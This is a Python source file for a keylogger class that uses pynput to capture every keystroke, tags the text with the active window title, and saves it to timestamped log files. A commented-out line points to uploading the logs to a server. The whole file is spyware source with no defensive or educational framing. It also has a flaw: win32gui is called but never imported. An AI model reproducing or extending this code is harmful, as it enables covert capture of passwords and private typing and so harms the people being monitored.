import os
import sys
import platform
import time
import logging
from datetime import datetime
import base64
import threading
import queue
import pynput
from pynput import keyboard
import win32api
import win32con
import win32security
import win32process
import win32event
import win32service
import win32serviceutil
import win32timezone

class Keylogger:
    def __init__(self):
        self.os_type = platform.system()
        self.setup_logging()
        self.key_queue = queue.Queue()
        self.is_running = False
        self.current_window = ""
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('keylogger.log'),
                logging.StreamHandler()
            ]
        )
        
    def get_active_window(self):
        """Get the title of the active window"""
        try:
            if self.os_type == 'Windows':
                hwnd = win32gui.GetForegroundWindow()
                return win32gui.GetWindowText(hwnd)
            return "Unknown Window"
        except:
            return "Unknown Window"
            
    def on_press(self, key):
        """Handle key press events"""
        try:
            if key == keyboard.Key.space:
                self.key_queue.put(' ')
            elif key == keyboard.Key.enter:
                self.key_queue.put('\n')
            elif key == keyboard.Key.backspace:
                self.key_queue.put('[BACKSPACE]')
            elif key == keyboard.Key.tab:
                self.key_queue.put('[TAB]')
            elif hasattr(key, 'char'):
                self.key_queue.put(key.char)
        except:
            pass
            
    def on_release(self, key):
        """Handle key release events"""
        if key == keyboard.Key.esc:
            return False
            
    def process_keys(self):
        """Process and format captured keys"""
        buffer = []
        last_window = ""
        
        while self.is_running:
            try:
                # Get current window
                current_window = self.get_active_window()
                
                # If window changed, add window info to buffer
                if current_window != last_window:
                    buffer.append(f"\n[Window: {current_window}]\n")
                    last_window = current_window
                    
                # Process keys from queue
                while not self.key_queue.empty():
                    key = self.key_queue.get_nowait()
                    buffer.append(key)
                    
                # If buffer is large enough, save it
                if len(buffer) >= 100:
                    self.save_keys(''.join(buffer))
                    buffer = []
                    
                time.sleep(0.1)
                
            except Exception as e:
                logging.error(f"Error processing keys: {str(e)}")
                time.sleep(1)
                
        # Save remaining keys
        if buffer:
            self.save_keys(''.join(buffer))
            
    def save_keys(self, keys):
        """Save captured keys to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"keylog_{timestamp}.txt"
            
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(keys)
                
            # Optional: Upload to server
            # self.upload_keys(filename)
            
        except Exception as e:
            logging.error(f"Error saving keys: {str(e)}")
            
    def start(self):
        """Start the keylogger"""
        try:
            self.is_running = True
            
            # Start key processing thread
            process_thread = threading.Thread(target=self.process_keys)
            process_thread.daemon = True
            process_thread.start()
            
            # Start keyboard listener
            with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
                listener.join()
                
        except Exception as e:
            logging.error(f"Error starting keylogger: {str(e)}")
            
    def stop(self):
        """Stop the keylogger"""
        self.is_running = False 